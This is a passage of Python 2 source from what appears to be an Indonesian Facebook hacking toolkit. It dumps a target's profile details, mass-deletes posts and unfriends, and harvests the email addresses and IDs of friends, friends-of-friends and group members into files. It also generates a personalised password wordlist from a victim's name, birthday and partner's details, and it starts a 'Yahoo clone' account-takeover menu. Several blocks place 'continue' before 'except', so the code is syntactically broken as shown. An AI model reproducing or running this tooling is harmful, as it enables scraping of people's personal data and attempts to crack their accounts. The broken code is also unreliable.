                b = json.loads(a.text)
                print 
                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Name : ' + lime + b['name']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] First name : ' + lime + b['first_name']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Middle name : ' + lime + b['middle_name']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Last name : ' + lime + b['last_name']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] ID : ' + lime + b['id']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Username : ' + lime + b['username']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Email : ' + lime + b['email']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Mobile phone : ' + lime + b['mobile_phone']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Locale : ' + lime + b['locale'].split('_')[0]
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Location : ' + lime + b['location']['name']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Hometown : ' + lime + b['hometown']['name']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Gender : ' + lime + b['gender']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Religion : ' + lime + b['religion']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Political : ' + lime + b['political']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Work : '
                    for i in b['work']:
                        
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' Position : ' + lime + i['position']['name']
                        except KeyError:
                            continue

                        
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' Employer : ' + lime + i['employer']['name']
                        except KeyError:
                            pass

                        
                        try:
                            if i['start_date'] == '0000-00':
                                print tutup + '     ' + lime + '-' + tutup + ' Start date : ' + lime + '---'
                            else:
                                print tutup + '     ' + lime + '-' + tutup + ' Start date : ' + lime + i['start_date']
                        except KeyError:
                            pass

                        
                        try:
                            if i['end_date'] == '0000-00':
                                print tutup + '     ' + lime + '-' + tutup + ' End date : ' + lime + '---'
                            else:
                                print tutup + '     ' + lime + '-' + tutup + ' End date : ' + lime + i['end_date']
                        except KeyError:
                            pass

                        
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' Location : ' + lime + i['location']['name']
                        continue
                        except KeyError:
                            continue
                        

                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Updated time : ' + lime + b['updated_time'][:10] + ' ' + b['updated_time'][11:19]
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Languages :'
                    for i in b['languages']:
                        
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' Languages : ' + lime + i['name']
                        continue
                        except KeyError:
                            continue
                        

                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Bio : ' + lime + b['bio']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Quotes : ' + lime + b['quotes']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Birthday : ' + lime + b['birthday'].replace('/', '-')
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] Link : ' + lime + b['link']
                except KeyError:
                    pass

                
                try:
                    print tutup + '[' + lime + '+' + tutup + '] School :'
                    for i in b['education']:
                        
                        try:
                            print tutup + '     ' + lime + '-' + tutup + ' School : ' + lime + i['name']
                        continue
                        except KeyError:
                            continue
                        

                except KeyError:
                    pass

                print tutup + '[' + lime + '+' + tutup + '] Done'
                raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
                menu()
                continue
            print tutup + '[' + merah + '!' + tutup + '] Not Found'
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            menu()
            return None


def deletepost():
    
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    load('\x1b[1;91m[+] \x1b[1;96mStart\x1b[1;92m ')
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        
        try:
            print 
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mDeleted\n'
            piro += 1
        continue
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Connection Error'
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            menu()
            continue
        

    
    print '\n%s(%s\xe2\x9c\x93%s) %sFinished' % (putih, hijau, putih, hijau)
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu()


def dump():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    print '%s(%s01%s)%s GET ID FRIENDS' % (putih, cyan, putih, hijau)
    print '%s(%s02%s)%s GET ID FRIENDS FROM FRIENDS' % (putih, cyan, putih, hijau)
    print '%s(%s03%s)%s GET GROUPS MEMBER ID' % (putih, cyan, putih, hijau)
    print '%s(%s04%s)%s GET GROUPS MEMBER EMAIL' % (putih, cyan, putih, hijau)
    print '%s(%s05%s)%s GET EMAIL FRIENDS' % (putih, cyan, putih, hijau)
    print '%s(%s06%s)%s GET EMAIL FRIENDS FROM FRIENDS' % (putih, cyan, putih, hijau)
    print '%s(%s00%s)%s BACK MENU' % (putih, cyan, putih, merah)
    dump_pilih()


def dump_pilih():
    mana = raw_input('\n       \x1b[34m>>> \x1b[33;1m ')
    if mana == '':
        print '%s(%s!%s)%s Invalid Menu' % (putih, merah, putih, merah)
        dump_pilih()
    elif mana in ('1', '01'):
        id_teman()
    elif mana in ('2', '02'):
        idfrom_teman()
    elif mana in ('3', '03'):
        id_member_grup()
    elif mana in ('4', '04'):
        em_member_grup()
    elif mana in ('5', '05'):
        email()
    elif mana in ('6', '06'):
        emailfrom_teman()
    elif mana in ('0', '00'):
        menu()
    else:
        print '\x1b[37m(\x1b[36m\xc3\x97\x1b[37m)\x1b[31m Invalid Menu'
        dump_pilih()


def emailfrom_teman():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        print 
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            os.system('reset')
            print logo
            print 
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        bz = open('out/em_teman_from_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                emfromteman.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(emfromteman)
        done = 'EMAIL-FROM-TEMAN.txt'
        os.rename('out/em_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()



def email():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        print 
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        a = json.loads(r.text)
        bz = open('out/email_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                em.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(em)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(em)
        done = 'EMAIL-TEMAN.txt'
        os.rename('out/email_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()



def id_teman():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        print 
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
        
        bz.close()
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idteman)
        done = 'ID-FRIENDS.txt'
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()



def idfrom_teman():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        print 
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            os.system('reset')
            print logo
            print 
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
        z = json.loads(r.text)
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
        
        bz.close()
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idfromteman)
        done = 'ID-FROM_TEMAN.txt'
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()



def id_member_grup():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        print 
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID group \x1b[1;91m:\x1b[1;97m ')
        
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            os.system('reset')
            print logo
            print 
            dump()

        bz = open('out/member_grup.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            idmem.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
        
        bz.close()
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idmem)
        done = 'ID-MEMBER-GROUPS.txt'
        os.rename('out/member_grup.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()



def em_member_grup():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        print 
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID group \x1b[1;91m:\x1b[1;97m ')
        
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
            os.system('reset')
            print logo
            print 
            dump()

        bz = open('out/em_member_grup.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                emmem.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(emmem)
        done = 'EMAIL-MEMBER-GROUPS.txt'
        os.rename('out/em_member_grup.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        os.system('reset')
        print logo
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()



def wordlist():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        print 
        print '\x1b[1;91m[?] \x1b[1;92mIsilah Dengan Lengkap Data Data Target'
        a = raw_input('\x1b[1;91m[+] \x1b[1;96mNama Depan     \x1b[1;91m:\x1b[32m ')
        file = open(a + '.txt', 'w')
        b = raw_input('\x1b[1;91m[+] \x1b[1;96mNama Tengah    \x1b[1;91m:\x1b[32m ')
        c = raw_input('\x1b[1;91m[+] \x1b[1;96mName Belakang  \x1b[1;91m:\x1b[32m ')
        d = raw_input('\x1b[1;91m[+] \x1b[1;96mNama Panggilan \x1b[1;91m:\x1b[32m ')
        e = raw_input('\x1b[1;91m[+] \x1b[1;96mTanggal Lahir \x1b[37m[\x1b[36mTTBBTT\x1b[37m]\x1b[31m :\x1b[32m ')
        f = e[0:2]
        g = e[2:4]
        h = e[4:]
        i = raw_input('\x1b[1;91m[+] \x1b[1;96mNama Pacar           \x1b[1;91m:\x1b[32m ')
        j = raw_input('\x1b[1;91m[+] \x1b[1;96mNama Panggilan Pacar \x1b[1;91m:\x1b[32m ')
        k = raw_input('\x1b[1;91m[+] \x1b[1;96mTanggal Lahir Pacar \x1b[37m[\x1b[36mTTBBTT\x1b[37m]\x1b[31m :\x1b[32m ')
        load('\x1b[1;91m[#] \x1b[1;96mSedang Membuat Wordlist \x1b[1;92m')
        l = k[0:2]
        m = k[2:4]
        n = k[4:]
        file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
        wg = 0
        while wg < 100:
            wg = wg + 1
            file.write(a + str(wg) + '\n')
        en = 0
        while en < 100:
            en = en + 1
            file.write(i + str(en) + '\n')
        word = 0
        while word < 100:
            word = word + 1
            file.write(d + str(word) + '\n')
        gen = 0
        while gen < 100:
            gen = gen + 1
            file.write(j + str(gen) + '\n')
        file.close()
        time.sleep(1.5)
        print '\n\x1b[1;91m[+] \x1b[1;92mWordlist Saved \x1b[1;91m: \x1b[1;97m %s.txt' % a
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    except IOError:
        e = None
        print '\x1b[1;91m[!] Membuat Wordlist Gagal'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()



def unfriend():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    load('\x1b[1;91m(~) \x1b[1;96mplease wait \x1b[1;92m')
    
    try:
        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(pek.text)
        for i in cok['data']:
            nama = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
            print '\n\x1b[1;97m[\x1b[1;96m Unfriend \x1b[1;97m]=>\x1b[1;92m ' + nama
    except IndexError:
        pass
    except KeyboardInterrupt:
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()

    print '\n\x1b[1;91m[+] \x1b[1;92mDone'
    raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
    menu()


def groupsaya():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    
    try:
        uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
        gud = json.loads(uh.text)
        for p in gud['data']:
            nama = p['name']
            id = p['id']
            f = open('Grupid.txt', 'w')
            listgrup.append(id)
            f.write(id + '\n')
            print '\x1b[1;97m[ \x1b[1;92mMyGroup\x1b[1;97m ] ' + str(id) + ' => ' + str(nama)
        
        print '%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % putih
        print '\x1b[1;91m(+) \x1b[1;92mTotal Group \x1b[1;91m:\x1b[1;97m %s' % len(listgrup)
        print '\x1b[1;91m(+) \x1b[1;92mSaved \x1b[1;91m: \x1b[1;97mGrupid.txt'
        f.close()
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m(!) Stopped'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    except KeyError:
        os.system('rm -rf Grupid.txt')
        print '\x1b[1;91m[!] Group not found'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No Connection'
        keluar()
    except IOError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[32m[ \x1b[31menter to back menu \x1b[32m] ')
        menu()



def menu_yahoo():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    print 
    print '%s(%s01%s) %sWHIT LIST FRIEND' % (putih, cyan, putih, hijau)
    print '%s(%s02%s) %sCLONE FROM FRIEND' % (putih, cyan, putih, hijau)
    print '%s(%s03%s) %sCLONE FROM MEMBER GROUPS' % (putih, cyan, putih, hijau)
    print '%s(%s04%s) %sUSING FILE' % (putih, cyan, putih, hijau)
    print '%s(%s00%s) %sBACK MENU' % (putih, cyan, putih, merah)
    yahoo_pilih()


def yahoo_pilih():
    mana = raw_input('\n       \x1b[34m>>> \x1b[33;1m ')
    if mana == '':
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()
    elif mana in ('1', '01'):
        yahoofriends()
    elif mana in ('2', '02'):
        yahoofromfriends()
    elif mana in ('3', '03'):
        yahoomember()
    elif mana in ('4', '04'):
        yahoolist()
    elif mana in ('0', '00'):
        menu()
    else:
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()


def yahoofriends():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m(!) Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    print 
    mpsh = []
    jml = 0
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
